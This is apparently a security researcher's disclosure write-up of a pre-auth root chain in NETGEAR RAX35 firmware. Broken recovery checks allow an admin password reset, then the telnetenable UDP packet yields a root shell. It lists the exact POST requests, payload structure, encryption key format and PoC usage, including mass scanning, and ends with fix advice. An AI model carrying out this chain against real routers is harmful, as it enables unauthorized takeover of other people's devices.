# NETGEAR RAX35: pre-auth root RCE via the password-recovery answer bypass and telnetenable

While reverse engineering the NETGEAR RAX35 firmware (V1.0.6.106_1.0.1, Lantiq/Intel GRX350 "XRX500", MIPS32 big-endian, extracted via CHK → SquashFS 4.0 LZMA at offset 0xD1), I found an authentication logic bug in `pucgi` — the root-owned CGI front end that handles every web request — that resets the admin password with three unauthenticated POSTs, plus the two well-known pieces that turn that into a root shell: the `pu_telnetEnabled` UDP telnetenable service and inetd's telnetd. The web stack (`pucgi`, `pucgid`, the recovery handlers) ships across the Lantiq-based RAX line — the lighttpd config in this same image references `/NETGEAR_RAX40.cfg` and `/NETGEAR_RAX38.cfg`, so those models almost certainly share it. Firmware V1.0.6.106 on the RAX35 is the only build I verified, so that's what this write-up sticks to.

## TL;DR

The password-recovery wizard is a three-step state machine, and all three steps are registered with **auth level 0** in `pucgi`'s handler table (`cgiFun` at 0x7DF40, 164 entries × 7 dwords; the GET/POST auth nibbles live in the third dword — level 0 means `main` never calls `VerifyBasicAuthentication`). The state machine's two validation gates are both fake:

- `CGIPOST_CheckSerial` (0x2A698) checks only that a `serialNumber` **parameter exists**. The supplied value is never compared to the device serial — the real serial is fetched and cached, and the attacker's input is discarded.
- `CGIPOST_CheckQuestions` (0x2A8C0) computes `Pulapi_Common_Hash256()` of `answer1`/`answer2` and then **never compares either hash to anything** (verified at instruction level, 0x2A9DC–0x2AA50: hash → `strcpy`, no `memcmp` on the results).

After those two no-op checks, `CGIPOST_ResetPwd` (0x2B53C) happily writes a new admin password via `PulapiMultiSetObj_Password` — persisted to config, so the takeover is also persistence. Password Recovery is **enabled by factory default** (`/etc/ctrlcfg`: `<pwdRecoveryEnable ...>1</pwdRecoveryEnable>`), so no victim interaction is needed.

With the new password, the classic NETGEAR telnetenable path completes the chain: `pu_telnetEnabled` (started at boot, procd-respawned) listens on UDP 23, Blowfish-decrypts the 128-byte `md5(mac+admin+pass)+mac+admin+pass` payload with the key `"AMBIT_TELNET_ENABLE+" + <boot-time admin password>`, and on match inserts an iptables ACCEPT for the sender on TCP 23 — where inetd's `telnetd -l /bin/login` validates the same admin credentials as root. `pu_telnetEnabled` snapshots the password once at boot, so after setting a new password the PoC reboots the router over the (now owned) admin GUI — `POST /ADVANCED_home2.htm` with `buttonSelect=2` (handler 0x3072C → `Pulapi_System_Reboot`) — to refresh the snapshot, then fires the UDP packet and logs in.

No credentials are needed at any point. Everything is LAN-side by default (lighttpd binds `[::]:80`; telnet is firewalled until the UDP packet opens it).

```
[no creds] POST /MNU_access_unauthorized_checkSerial.htm   Continue=1&serialNumber=<anything>
                                                           -> value unchecked, recovery state 1
[no creds] POST /MNU_access_unauthorized_checkQuestions.htm Continue=1&answer1=a&answer2=b
                                                           -> hashes computed, never compared, state 2
[no creds] POST /reset_password.htm                        sysNewPasswd/sysConfirmPasswd/...
                                                           -> PulapiMultiSetObj_Password, admin = ours
[admin]    POST /ADVANCED_home2.htm buttonSelect=2         -> reboot refreshes pu_telnetEnabled snapshot
[no creds] UDP 23 telnetenable packet (Blowfish/MD5)       -> iptables ACCEPT for our IP on TCP 23
[root]     telnet -> /bin/login admin/<new password>       -> root shell
```

## Background: how pucgi works

The web tier is `lighttpd` → `mod_cgi`, with `cgi.assign` routing **every** `.cgi`/`.htm`/`.html` (and a list of `.js`/`.zip`/`.cfg` paths) to `/opt/vendor/www2/cgi/pucgi` — a 460 KB MIPS BE binary that does auth, CSRF tokens, page templating and dispatch for the whole GUI. `lighttpd` runs as root (no `server.username` in the config), so `pucgi` and everything it `system()`s executes as root.

`pucgi`'s `main` (0x8E90) parses CGI env vars, looks the URI up in the `cgiFun` table via `sub_AE30`, and derives the required auth from the entry: `GET → entry[2] & 0xF`, `POST → (entry[2] >> 4) & 0xF`. Level 0 short-circuits straight to the handler; level 3 means `VerifyBasicAuthentication` (Basic auth against the admin password plus `USER_TOKEN` cookie machinery). Two white lists (`normal_white_list` 0x7C2C0, `blank_white_list` 0x7CAC0) cover URIs with no table entry — the blank-state list is what exposes the setup wizard on factory-reset devices.

Recovery state is stored via `SetRemoteCache(23, ...)`/`GetRemoteCache(23, ...)` against `pucgid` — a 6 KB localhost daemon on 127.0.0.1:30069 that keeps a global key/value cache. The cache is **process-global and not bound to the client** in any way: the three recovery POSTs don't even need to come from the same host.

## Bug 1: the serial check validates nothing (CWE-287)

From `CGIPOST_CheckSerial` (0x2A698), the only gate in front of state 1:

```c
if (PulapiGetObj_PwdRecovery(&v9) == 1)      // recovery feature enabled (default: 1)
    v2 = *v9;
...
if (GetCgiValue(body, "Continue") == 1)
    CgiValue = GetCgiValue(body, "serialNumber");   // presence only
...
if (CgiValue == 1 && PulapiGetObj_SerialNumber(src, &v8) == 1) {
    strncpy(s, src, 0x40);           // the DEVICE's serial, not the user's input
    s[49] = 1;                       // state = 1
    CgiRewrite(a1, "/MNU_access_unauthorized_checkQuestions.htm");
```

`GetCgiValue` (0x14D04) returns 1 when the parameter parses; the parsed value is never used. Any body of the form `Continue=1&serialNumber=x` advances the state machine.

## Bug 2: the security answers are hashed and thrown away (CWE-287)

From `CGIPOST_CheckQuestions` (0x2A8C0) — the core defect:

```c
if (GetCgiValue(body, "answer1", buf1, 0x41) == 1) {
    Pulapi_Common_Hash256(hash1, buf1);      // 0x2A9DC
    strcpy(hash1, buf1);                     // hmm, result copied...
    if (GetCgiValue(body, "answer2", buf2, 0x41) == 1) {
        Pulapi_Common_Hash256(hash2, buf2);  // 0x2AA30
        strcpy(hash2, buf2);
    }
}
if (CgiValue != 1) -> err page
if (cache_state == 1) {                       // 0x2AA6C: serial stage done
    PulapiGetObj_AdminPassword(serial, &pw);  // fetch stored creds object
    cache_state = 2;                          // 0x2AAD4
    CgiRewrite(a1, "/reset_password.htm");    // 0x2AAF8
}
```

Neither hash is ever passed to a comparison. The disassembly between 0x2A9DC and 0x2AA50 shows exactly two `Pulapi_Common_Hash256` calls followed by `strcpy`s into stack buffers that are never read again. Both "wrong answer" and "right answer" take the same path to state 2.

## Bug 3: state 2 = password write (the payoff)

`CGIPOST_ResetPwd` (0x2B53C) requires cache state 2 and a passing `CheckPasswordVaild` (0x16E40 — length 6..32, `!= "password"`), hashes the two new recovery answers, and commits:

```c
s[0] = 0; v25[0] = 1; v15 = 255; v16 = 255;
PulapiMultiSetObj_Password(3, &obj);         // new admin password -> config (persisted)
```

The `PulapiGetObj_PwdRecovery` gate in Bug 1 reads `pwdRecoveryEnable`, which the stock `/etc/ctrlcfg` ships as `1`. NETGEAR's own recovery page encourages users to leave it on.

## The telnet leg: pu_telnetEnabled

`/etc/init.d/pu_telnetEnabled` starts `pu_telnetEnabled -o` at boot (START=99, `respawn`). With `-o` it binds UDP 23 on IPv4 and IPv6 (`main` in the binary) and processes the classic telnetenable protocol in `do_recv`:

- key = `"AMBIT_TELNET_ENABLE+" + <payload.password>` — the password `fillMd5payload` fetched from `PulapiGetObj_Password("admin", ...)` **once at boot** (with a `"password"` fallback if empty);
- payload = 128 bytes: `[0:16]` = `MD5(payload[16:128])`, `[16:28]` = br-lan MAC as 12 **uppercase** hex chars (`MacTransFromHex` is a 12× `toupper`), `[32:37]` = `admin`, `[48:...]` = password;
- Blowfish-ECB, 8-byte blocks (`Blowfish_Decrypt(&ctx, xl, xr)` per block, with a byte-swapped second chance for the other endianness);
- on `strcmp` match of mac/username/password it runs
  `iptables -t filter -I FW_TELNET_ENABLE -p tcp --dport 23 -i br-lan -s <sender> -j ACCEPT`.

inetd (`/etc/init.d/inetd`, START=04) keeps `telnetd -l /bin/login` on TCP 23 behind that chain, and `/bin/login` checks the **live** admin password. The boot-time snapshot is the one wrinkle: changing the password does not refresh `pu_telnetEnabled` (no restart call anywhere in `pucgi` — `fillMd5payload` has exactly one xref, from `main`). Hence the reboot leg: as admin, `POST /ADVANCED_home2.htm` with `buttonSelect=2` (0x3072C forks and calls `Pulapi_System_Reboot`), and on the next boot the snapshot is our password. On factory-default devices (snapshot = `password`) the UDP leg works immediately with the default credential, no reboot needed.

## Chaining

A working PoC is in [`netgear-rax35-poc.go`](netgear-rax35-poc.go) (stdlib-only Go; the Blowfish tables are embedded and checked against the standard test vector):

```
go build netgear-rax35-poc.go
./netgear-rax35-poc -host 192.168.1.1 -mac A4:2B:8C:11:22:33
./netgear-rax35-poc -host 192.168.1.1 -no-telnet                 # takeover only
./netgear-rax35-poc -password 'N3wP@ss' -skip-recovery ...       # reuse a known password
zmap -p 80 -q | ./netgear-rax35-poc -port 80 -workers 50         # stdin streaming: ip[:port][,mac]
```

The router MAC comes from ARP (`arp -a` on Windows, `ip neigh` on Linux) — it's the br-lan MAC, which any LAN host already has in its ARP cache. Per target the PoC fires the three recovery POSTs, confirms the new password with a Basic-auth GET of an auth-level-3 page, sends the telnetenable packet, and classifies the result: a root shell banner means full chain success; a closed TCP 23 triggers the `-auto-reboot` leg (admin GUI reboot, `-reboot-wait` sleep, retry) before giving up. `-no-telnet` limits it to the pure pre-auth admin takeover, which is the highest-confidence primitive here.

## Impact

- Bugs 1–3 chained: unauthenticated admin password reset on any LAN-reachable RAX35 with recovery enabled — which is the factory default. Two to three POSTs, no corruption, deterministic. `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`, 9.8 for the takeover.
- With the telnetenable leg: pre-auth root shell. The recovery state machine lives in a global cache unbound to the client, and `pucgid` does not authenticate its localhost clients at all.
- Same web stack is referenced for RAX40/RAX38 in this image's lighttpd config; the `pucgi` recovery handlers are generic NETGEAR wizard code, so adjacent Lantiq-based models and older builds deserve a diff.

## Mitigation / what the fix should look like

- Compare what you hash: `CGIPOST_CheckQuestions` must `memcmp` the `Pulapi_Common_Hash256` outputs against the stored answer hashes, and `CGIPOST_CheckSerial` must compare the supplied serial to the device serial — both comparisons are simply missing.
- Bind recovery state to the client (IP + signed token) instead of a global `pucgid` cache slot, and rate/lock the flow (one recovery attempt per boot would have contained this).
- Treat the wizard endpoints as sensitive: they are the only auth-level-0 POST handlers in the table, and at minimum the password-write step should require a fresh, single-use grant.
- Refresh `pu_telnetEnabled`'s credential snapshot on password change (or drop telnetenable entirely — it is a credential-equivalent back door keyed on a MAC address that every LAN client already knows).

## Notes

- Verified by static analysis of the extracted V1.0.6.106_1.0.1 SquashFS. IDA databases were built for `opt/vendor/www2/cgi/pucgi` (handler table `cgiFun` 0x7DF40, `main` 0x8E90, `CheckSerial` 0x2A698, `CheckQuestions` 0x2A8C0, `ResetPwd` 0x2B53C, `GetCgiValue` 0x14D04, `CheckPasswordVaild` 0x16E40), `usr/bin/pu_telnetEnabled` (`main`, `do_recv`, `fillMd5payload`), `opt/vendor/www2/cgi/pucgid`, and `www/cgi-bin/genie.cgi`. All vaddrs are file vaddrs.
- I have not run the PoC against hardware; the chain is fully specified by the static analysis and every step's acceptance criteria are implemented and unit-tested in the PoC (the Blowfish layer is checked against the standard `BLOWFISH` test vector).
- Also noted during the pass (unfixed leads, not chained here): pre-auth fingerprinting via `/currentsetting.htm` and `/debuginfo.htm`; a WPS-hostname `popen` injection lead in `CGIOUTPUT_WpsSuccess` (0x50F04, `grep -i '%s '` with a DHCP-client-controlled hostname); unauthenticated cloud/remote daemons (`ntgr_ra_dce`, `rcagentd`, `XAgent`) that were not audited in this pass.
